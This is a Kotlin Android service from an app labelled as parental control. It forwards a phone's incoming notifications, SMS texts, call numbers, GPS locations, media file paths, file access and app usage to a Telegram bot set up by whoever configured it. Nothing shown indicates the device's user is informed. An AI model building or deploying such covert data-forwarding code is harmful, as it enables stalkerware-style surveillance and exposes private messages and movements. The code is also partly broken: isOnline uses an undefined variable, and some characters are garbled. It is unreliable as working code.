package com.parentalcontrol.monitor.services

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.IBinder
import com.parentalcontrol.monitor.api.TelegramApi
import com.parentalcontrol.monitor.database.MonitoringDatabase
import com.parentalcontrol.monitor.models.AppUsageData
import com.parentalcontrol.monitor.models.FileAccessData
import com.parentalcontrol.monitor.models.TelegramMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.text.SimpleDateFormat
import java.util.*

class TelegramService : Service() {
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    private var telegramApi: TelegramApi? = null
    private var botToken: String? = null
    private var chatId: String? = null
    private var database: MonitoringDatabase? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    
    override fun onCreate() {
        super.onCreate()
        initialize(this)
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            when (it.getStringExtra("action")) {
                "send_message" -> {
                    val message = it.getStringExtra("message")
                    if (message != null) {
                        scope.launch {
                            sendMessage(message)
                        }
                    }
                }
            }
        }
        return START_STICKY
    }
    
    private fun initialize(context: Context) {
        this.database = MonitoringDatabase.getDatabase(context)
        val sharedPrefs = context.getSharedPreferences("telegram_config", Context.MODE_PRIVATE)
        botToken = sharedPrefs.getString("bot_token", null)
        chatId = sharedPrefs.getString("chat_id", null)
        
        if (!botToken.isNullOrEmpty()) {
            setupTelegramApi()
            
            // Process any pending offline data
            scope.launch {
                processPendingData()
            }
        }
    }
    
    private fun setupTelegramApi() {
        val retrofit = Retrofit.Builder()
            .baseUrl("https://api.telegram.org/bot$botToken/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        
        telegramApi = retrofit.create(TelegramApi::class.java)
    }
    
    private suspend fun processPendingData() {
        if (!isOnline()) return
        
        database?.let { db ->
            // Process pending notifications
            val unsentNotifications = db.notificationDao().getUnsentNotifications()
            unsentNotifications.forEach { notification ->
                val success = sendNotificationAlert(
                    notification.appName,
                    notification.title,
                    notification.text,
                    notification.timestamp
                )
                if (success) {
                    db.notificationDao().markAsSent(notification.id)
                }
            }
            
            // Process pending locations
            val unsentLocations = db.locationDao().getUnsentLocations()
            unsentLocations.forEach { location ->
                val success = sendLocationUpdate(
                    location.latitude,
                    location.longitude,
                    location.accuracy,
                    location.address,
                    location.timestamp
                )
                if (success) {
                    db.locationDao().markAsSent(location.id)
                }
            }
            
            // Process pending media files
            val unsentMediaFiles = db.mediaFileDao().getUnsentMediaFiles()
            unsentMediaFiles.forEach { mediaFile ->
                val success = sendMediaFileAlert(
                    mediaFile.fileName,
                    mediaFile.filePath,
                    mediaFile.fileType,
                    mediaFile.fileSize,
                    mediaFile.dateAdded
                )
                if (success) {
                    db.mediaFileDao().markAsSent(mediaFile.id)
                }
            }
        }
    }
    
    fun sendAppUsageReport(usageData: List<AppUsageData>) {
        if (!isConfigured()) return
        
        scope.launch {
            try {
                val message = formatAppUsageMessage(usageData)
                sendMessage(message)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    fun sendFileAccessReport(fileData: List<FileAccessData>) {
        if (!isConfigured()) return
        
        scope.launch {
            try {
                val message = formatFileAccessMessage(fileData)
                sendMessage(message)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    suspend fun sendNotificationAlert(appName: String, title: String, text: String, timestamp: Long): Boolean {
        if (!isConfigured() || !isOnline()) return false
        
        return try {
            val message = "📱 <b>Notification</b>\n\n" +
                    "📋 App: $appName\n" +
                    "📄 Title: $title\n" +
                    "💬 Text: $text\n" +
                    "🕐 Time: ${formatTimestamp(timestamp)}"
            
            sendMessage(message)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
    
    suspend fun sendLocationUpdate(latitude: Double, longitude: Double, accuracy: Float, address: String?, timestamp: Long): Boolean {
        if (!isConfigured() || !isOnline()) return false
        
        return try {
            val message = "📍 <b>Location Update</b>\n\n" +
                    "🌐 Coordinates: $latitude, $longitude\n" +
                    "🎯 Accuracy: ${accuracy}m\n" +
                    "${if (address != null) "📍 Address: $address\n" else ""}" +
                    "🕐 Time: ${formatTimestamp(timestamp)}\n\n" +
                    "<a href=\"https://maps.google.com/?q=$latitude,$longitude\">View on Google Maps</a>"
            
            sendMessage(message)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
    
    suspend fun sendSmsAlert(sender: String, message: String, timestamp: Long): Boolean {
        if (!isConfigured() || !isOnline()) return false
        
        return try {
            val alertMessage = "💬 <b>SMS Received</b>\n\n" +
                    "👤 From: $sender\n" +
                    "💬 Message: $message\n" +
                    "🕐 Time: ${formatTimestamp(timestamp)}"
            
            sendMessage(alertMessage)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
    
    suspend fun sendCallAlert(type: String, phoneNumber: String, timestamp: Long): Boolean {
        if (!isConfigured() || !isOnline()) return false
        
        return try {
            val emoji = when (type) {
                "Incoming Call" -> "📞"
                "Outgoing Call" -> "📱"
                "Call Answered" -> "✅"
                "Call Ended" -> "❌"
                else -> "📞"
            }
            
            val message = "$emoji <b>$type</b>\n\n" +
                    "� Number: $phoneNumber\n" +
                    "🕐 Time: ${formatTimestamp(timestamp)}"
            
            sendMessage(message)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
    
    suspend fun sendMediaFileAlert(fileName: String, filePath: String, fileType: String, fileSize: Long, dateAdded: Long): Boolean {
        if (!isConfigured() || !isOnline()) return false
        
        return try {
            val emoji = when (fileType.lowercase()) {
                "image" -> "🖼️"
                "video" -> "🎥"
                "audio" -> "🎵"
                else -> "📄"
            }
            
            val message = "$emoji <b>New Media File</b>\n\n" +
                    "📄 Name: $fileName\n" +
                    "📂 Path: $filePath\n" +
                    "📊 Size: ${formatFileSize(fileSize)}\n" +
                    "📝 Type: $fileType\n" +
                    "🕐 Added: ${formatTimestamp(dateAdded)}"
            
            sendMessage(message)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
    
    fun sendAlert(alertMessage: String) {
        if (!isConfigured()) return
        
        scope.launch {
            try {
                val message = "�🚨 <b>ALERT</b> 🚨\n\n$alertMessage\n\n🕐 Time: ${getCurrentTimeString()}"
                sendMessage(message)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    suspend fun sendMessage(text: String): Boolean {
        return try {
            telegramApi?.sendMessage(
                TelegramMessage(
                    chatId = chatId!!,
                    text = text,
                    parseMode = "HTML"
                )
            )
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
    
    private fun isOnline(): Boolean {
        context?.let { ctx ->
            val connectivityManager = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val networkCapabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            
            return networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
        }
        return false
    }
    
    private fun formatAppUsageMessage(usageData: List<AppUsageData>): String {
        val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
        val builder = StringBuilder()
        
        builder.append("📱 <b>Social Media Usage Report</b>\n")
        builder.append("Time: ${getCurrentTimeString()}\n\n")
        
        usageData.forEach { data ->
            val timeUsedMinutes = data.timeUsed / (1000 * 60)
            val lastUsedTime = dateFormat.format(Date(data.lastTimeUsed))
            
            builder.append("📋 <b>${data.appName}</b>\n")
            builder.append("⏱️ Usage: ${timeUsedMinutes} minutes\n")
            builder.append("🕐 Last used: $lastUsedTime\n\n")
        }
        
        return builder.toString()
    }
    
    private fun formatFileAccessMessage(fileData: List<FileAccessData>): String {
        val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
        val builder = StringBuilder()
        
        builder.append("📁 <b>File Access Report</b>\n")
        builder.append("Time: ${getCurrentTimeString()}\n\n")
        
        fileData.forEach { data ->
            val accessTime = dateFormat.format(Date(data.accessTime))
            
            builder.append("📄 <b>${data.fileName}</b>\n")
            builder.append("📂 Path: ${data.filePath}\n")
            builder.append("📊 Size: ${formatFileSize(data.fileSize)}\n")
            builder.append("🕐 Accessed: $accessTime\n")
            builder.append("🔍 Type: ${data.fileType}\n\n")
        }
        
        return builder.toString()
    }
    
    private fun formatFileSize(bytes: Long): String {
        val kb = bytes / 1024.0
        val mb = kb / 1024.0
        val gb = mb / 1024.0
        
        return when {
            gb >= 1 -> String.format("%.2f GB", gb)
            mb >= 1 -> String.format("%.2f MB", mb)
            kb >= 1 -> String.format("%.2f KB", kb)
            else -> "$bytes bytes"
        }
    }
    
    private fun formatTimestamp(timestamp: Long): String {
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return dateFormat.format(Date(timestamp))
    }
    
    private fun getCurrentTimeString(): String {
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return dateFormat.format(Date())
    }
    
    private fun isConfigured(): Boolean {
        return !botToken.isNullOrEmpty() && !chatId.isNullOrEmpty() && telegramApi != null
    }
    
    companion object {
        fun saveTelegramConfig(context: Context, botToken: String, chatId: String) {
            val sharedPrefs = context.getSharedPreferences("telegram_config", Context.MODE_PRIVATE)
            sharedPrefs.edit()
                .putString("bot_token", botToken)
                .putString("chat_id", chatId)
                .apply()
        }
        
        fun getTelegramConfig(context: Context): Pair<String?, String?> {
            val sharedPrefs = context.getSharedPreferences("telegram_config", Context.MODE_PRIVATE)
            return Pair(
                sharedPrefs.getString("bot_token", null),
                sharedPrefs.getString("chat_id", null)
            )
        }
    }
}
